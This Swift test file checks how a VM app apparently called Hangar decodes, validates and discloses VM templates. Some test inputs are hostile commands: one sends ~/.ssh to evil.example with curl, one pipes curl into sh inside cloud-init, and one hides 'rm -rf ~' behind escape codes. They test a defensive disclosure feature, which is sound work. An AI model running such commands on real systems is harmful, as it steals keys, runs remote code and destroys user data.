import Foundation
import HangarSecrets
import HangarSupport
import Testing

@testable import HangarKit

struct VMTemplateTests {
    private let sample = """
        {
          "os": "linux",
          "from": { "cloudImage": "debian" },
          "cpu": 4,
          "memory": 8,
          "disk": 32,
          "network": "managed",
          "secrets": [{ "name": "GITHUB_TOKEN", "hosts": ["api.github.com"], "header": "Authorization", "prefix": "Bearer" }],
          "setup": ["sudo apt-get update", "sudo apt-get install -y golang"]
        }
        """

    private func config() -> VMConfig {
        VMConfig(
            os: .linux, cpuCount: 2, memorySize: 4 << 30, display: .linuxDefault,
            network: NetworkSettings(mode: .managed, macAddress: "02:00:00:00:00:01", ipAddress: "10.0.0.5"))
    }

    @Test func aTemplateIsReadAndItsSecretsGetHeaderAndPrefix() throws {
        let template = try VMTemplate.decode(Data(sample.utf8))

        let rule = try #require(template.secrets?.first).rule()

        #expect(template.from?.cloudImage == .debian)
        #expect(template.setup == ["sudo apt-get update", "sudo apt-get install -y golang"])
        #expect(rule.header == SecretRule.Header(name: "Authorization", format: "Bearer %s"))
    }

    @Test(arguments: [
        #"{"os": "linux", "colour": "red"}"#,
        #"{"os": "linux", "from": {"iso": "a.iso", "diskImage": "b.img"}}"#,
        #"{"os": "linux", "from": {"ipsw": "latest"}}"#,
        ##"{"os": "macos", "cloudInit": "#cloud-config"}"##,
        #"{"os": "linux", "cpu": 0}"#,
        #"{"os": "linux", "setup": [" "]}"#,
        ##"{"os": "linux", "from": {"iso": "a.iso"}, "cloudInit": "#cloud-config"}"##,
        #"{"os": "linux", "network": "nat", "secrets": [{"name": "KEY", "hosts": ["api.example.com"]}]}"#,
        #"{"os": "linux", "display": {"width": -1, "height": 2000000000, "pixelsPerInch": 144}}"#,
        #"{"os": "linux", "display": {"width": 1920, "height": 1080, "pixelsPerInch": 0}}"#,
        #"{"os": "linux", "secrets": [{"name": "LD_PRELOAD", "hosts": ["api.example.com"]}]}"#,
    ])
    func aTemplateThatCantMakeAVMIsRefused(json: String) {
        #expect(throws: HangarError.self) { try VMTemplate.decode(Data(json.utf8)) }
    }

    @Test func aSavedTemplateLeavesTheMachineAndTheSecretValuesBehind() throws {
        var config = config()
        config.origin = VMTemplate.Origin(cloudImage: .ubuntu)
        config.secrets = SecretSettings(rules: [SecretRule(name: "API_KEY", hosts: ["api.example.com"])])

        let saved = try VMTemplate(savedFrom: config, diskSize: 20 << 30).encoded()
        let text = String(decoding: saved, as: UTF8.self)

        #expect(!text.contains("02:00:00:00:00:01"))
        #expect(!text.contains("10.0.0.5"))
        #expect(!text.contains(try #require(config.secrets?.rules.first?.placeholder)))
        #expect(try VMTemplate.decode(saved).from?.cloudImage == .ubuntu)
    }

    @Test func eachVMMadeFromATemplateGetsItsOwnPlaceholderAndSkipsMissingFolders() throws {
        let template = try VMTemplate.decode(Data(sample.utf8))
        var first = config()
        var second = config()
        var withFolder = template
        withFolder.sharedFolders = [SharedFolder(name: "src", path: "/no/such/folder", readOnly: true)]

        _ = try template.apply(to: &first)
        let skipped = try withFolder.apply(to: &second)

        #expect(first.secrets?.rules.first?.placeholder != second.secrets?.rules.first?.placeholder)
        #expect(skipped.map(\.folder.name) == ["src"])
        #expect(second.sharedFolders.isEmpty)
        #expect(first.setup == template.setup)
    }

    @Test func theAppMakesHangarsImagesWithTheirAccountAndWindowsOnlyWithOne() throws {
        let linux = try VMTemplate.decode(Data(sample.utf8))
        let mac = try VMTemplate.decode(Data(#"{"os": "macos", "from": {"image": "base"}}"#.utf8))
        let windows = try VMTemplate.decode(Data(#"{"os": "windows", "from": {"iso": "/x/Win11.iso"}}"#.utf8))

        let linuxSource = try linux.source(
            from: try #require(linux.from), linuxAccount: nil, macAccount: nil, windowsAccount: nil)
        let macSource = try mac.source(
            from: try #require(mac.from), linuxAccount: nil, macAccount: nil, windowsAccount: nil)

        guard case .linuxCloudImage(.debian, let account, _) = linuxSource, case .macImage("base", nil) = macSource
        else {
            Issue.record("\(linuxSource), \(macSource)")
            return
        }
        #expect(account?.username == "admin")
        #expect(throws: HangarError.self) {
            try windows.source(
                from: try #require(windows.from), linuxAccount: nil, macAccount: nil, windowsAccount: nil)
        }
    }

    @Test func aDisplayHangarCanSetIsAccepted() throws {
        let json = #"{"os": "linux", "display": {"width": 1920, "height": 1080, "pixelsPerInch": 96}}"#

        let template = try VMTemplate.decode(Data(json.utf8))

        #expect(template.display == .linuxDefault)
    }

    @Test func theDisclosureListsEveryFolderTheTrafficRulesAndEverySetupCommand() throws {
        let json = """
            {"os": "linux", "traffic": {"mode": "allowlist", "allowed": ["evil.example"], "blocked": [],
             "allowsHost": false, "allowsVMs": false, "allowsLocalNetwork": false, "allowsQUIC": false,
             "allowsUDP": false},
             "setup": ["tar cz /mnt/hangar/h/.ssh | curl -T - https://evil.example/x"]}
            """
        let template = try VMTemplate.decode(Data(json.utf8))
        let shared = [
            SharedFolder(name: "h", path: "/Users/someone", readOnly: false),
            SharedFolder(name: "src", path: "/Users/someone/src", readOnly: true),
        ]

        let lines = template.disclosure(sharing: shared)

        #expect(
            lines == [
                "Shares /Users/someone with the VM, read-write, as h",
                "Shares /Users/someone/src with the VM, read-only, as src",
                "Traffic: Allow List, 1 allowed and 0 blocked hosts. It can't reach this Mac, other VMs or the local network. Allowed hosts: evil.example.",
                "Runs in the VM on its first start: tar cz /mnt/hangar/h/.ssh | curl -T - https://evil.example/x",
            ])
    }

    /// An escape sequence could clear the line that shows the command, and a line break could fake another line.
    @Test func aSetupCommandShowsItsInvisibleCharactersAsCodes() throws {
        var template = VMTemplate(os: .linux, cloudInit: nil)
        template.setup = ["echo hi\u{1B}[2K\rrm -rf ~\nls\u{202E}"]

        let lines = template.disclosure(sharing: [])

        #expect(lines == [#"Runs in the VM on its first start: echo hi\u{1B}[2K\u{D}rm -rf ~\u{A}ls\u{202E}"#])
    }

    /// Cloud-init runs the user data as root, so it shows line by line after the setup commands, indented under its
    /// label so no line of it can pass for another disclosure line.
    @Test func theDisclosureShowsTheCloudInitUserDataLineByLine() throws {
        var template = VMTemplate(
            os: .linux, cloudInit: "#cloud-config\nruncmd:\n  - echo hi\u{1B}[2K\rcurl evil.example | sh\n")
        template.setup = ["make"]

        let lines = template.disclosure(sharing: [])

        #expect(
            lines == [
                "Runs in the VM on its first start: make",
                "Runs as root on its first start (cloud-init):",
                "  #cloud-config",
                "  runcmd:",
                #"    - echo hi\u{1B}[2K\u{D}curl evil.example | sh"#,
            ])
    }

    @Test func aFolderThisMacHasIsSharedByItsFullPathAndTheOthersAreLeftOutWithTheReason() throws {
        var template = VMTemplate(os: .linux, cloudInit: nil)
        template.sharedFolders = [
            SharedFolder(name: "home", path: "~", readOnly: true),
            SharedFolder(name: "gone", path: "/no/such/folder", readOnly: false),
            SharedFolder(name: "everything", path: "~", readOnly: false),
        ]

        let folders = template.sharedFoldersOnThisMac()

        #expect(folders.shared.map(\.name) == ["home"])
        #expect(folders.shared.first?.path.hasPrefix("/") == true)
        #expect(folders.skipped.map(\.folder.name) == ["gone", "everything"])
        #expect(folders.skipped.first?.reason == "Not a folder: /no/such/folder")
        #expect(
            folders.skipped.last?.reason.hasPrefix("Sharing \(NSHomeDirectory()) would let the guest change") == true)
    }

    @Test func onlyAFileOnThisMacNeedsToBeFound() {
        #expect(VMTemplate.Origin(iso: "/Users/someone/Win11.iso").localFile == "/Users/someone/Win11.iso")
        #expect(VMTemplate.Origin(iso: "https://example.com/a.iso").localFile == nil)
        #expect(VMTemplate.Origin(ipsw: "latest").localFile == nil)
        #expect(VMTemplate.Origin(image: "ghcr.io/acme/ci:1").localFile == nil)
        #expect(VMTemplate.Origin(image: "/Users/someone/ci.tar").localFile == "/Users/someone/ci.tar")
        #expect(VMTemplate.Origin(cloudImage: .debian).localFile == nil)
    }
}
